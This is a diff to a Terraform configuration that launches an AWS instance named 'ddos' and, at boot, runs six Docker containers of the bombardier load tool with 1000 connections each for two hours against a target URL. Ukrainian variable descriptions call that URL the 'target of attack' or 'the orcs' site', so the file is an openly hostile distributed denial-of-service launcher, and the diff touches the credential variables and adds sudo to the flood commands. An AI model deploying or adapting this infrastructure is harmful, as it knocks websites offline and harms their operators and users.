@@ -1,7 +1,15 @@
 provider "aws" {
     region = "us-east-2"
-    access_key = var.aws_key.access
-    secret_key = var.aws_key.secret 
+    access_key = var.aws_key_access
+    secret_key = var.aws_key_secret 
+}
+variable "aws_key_access" {
+  description = "Ціль атаки - або введи сайт орків:"
+  type = string
+}
+variable "aws_key_secret" {
+  description = "Ціль атаки - або введи сайт орків:"
+  type = string
 }
 
 data "aws_ami" "ubuntu" {
@@ -40,11 +48,11 @@ resource "aws_instance" "ddos"  {
   #!/bin/bash
   sudo apt install docker.io -y
   sudo systemctl start docker
-  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
-  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
-  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
-  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
-  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
-  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
+  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
+  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
+  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
+  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
+  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
+  sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
 EOF
 }
